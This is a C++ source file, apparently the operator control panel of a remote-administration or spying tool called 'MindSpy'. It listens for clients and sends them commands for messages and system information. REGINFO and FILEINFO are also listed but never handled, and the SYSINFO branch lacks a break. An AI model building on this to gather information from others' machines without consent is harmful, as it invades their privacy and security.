#include "CPanel.h"

namespace MindSpy 
{
	int CPanel::TipoComando(const char*c) 
	{
		// Obtener el comando interno con base en un char*
		const int CANTIDAD_COMANDOS = 5;
		char ComandosInternos[CANTIDAD_COMANDOS][16] = { "ALIAS", "ENVIAR", "SYSINFO", "REGINFO", "FILEINFO" };
		for (int i = 0; i < CANTIDAD_COMANDOS; i++) 
		{
			if (!strcmp(ComandosInternos[i], c)) 
				return i;
		}
		return -1;
	}

	void CPanel::Run()
	{

		stringstream str;
		string Comando, Op1, Op2;
		char Mensaje[4096];
		Servidor c;
		int SizeOpcode;
		// Iniciar la escucha del servidor
		if (c.Listo()) c.IniciarEscucha();
		while (true) {
			// Limpiar la memoria del mensaje
			ZeroMemory(Mensaje, sizeof(Mensaje));
			// Esperar por un comando del usuario
			cin.getline(Mensaje, 4096, '\n');
			// Limpiar el stream de comandos
			str.clear();
			// Empujar la cadena de comandos en el stream
			str << Mensaje;
			// Sacar el comando
			str >> Comando;
			// Sacar el primer operando
			str >> Op1;
			// El resto de la cadena es el segundo operando
			getline(str, Op2, '\n');

			// Convertirlo a may�sculas, se evita strupr
			for (unsigned int i = 0; i < Comando.length(); i++)
			{
				Comando[i] = toupper(Comando[i]);
			}

			// Analizar el comando, y dar una respuesta con base en �l
			switch (TipoComando(Comando.c_str()))
			{
			case INTERNOS_CMDS::REQ_ALIAS:
				if (c.SetAlias(Op1.c_str(), Op2.c_str()))
				{
					cout << "Alias cambiado." << endl;
				}
				else
				{
					cout << "Alias no cambiado." << endl;
				}
				break;

			case INTERNOS_CMDS::REQ_ENVIAR:
				if (c.EnviarComando((char*)Op1.c_str(), Op2.length(), CLNT_CMDS::MENSAJE, (BYTE*)Op2.c_str()))
				{
					cout << "Mensaje enviado." << endl;
				}
				else
				{
					cout << "Mensaje no enviado." << endl;
				}
				break;

			case INTERNOS_CMDS::REQ_SYSINFO:
				if (c.EnviarComando((char*)Op1.c_str(), NULL, CLNT_CMDS::SYSINFO, NULL))
				{
					cout << "Solicitando informaci�n de sistema..." << endl;
				}
				else
				{
					cout << "Solicitud fallida" << endl;
				}


			default:
				cout << "Comando \"" << Comando << "\" no existente" << endl;
			}
		}
	}
}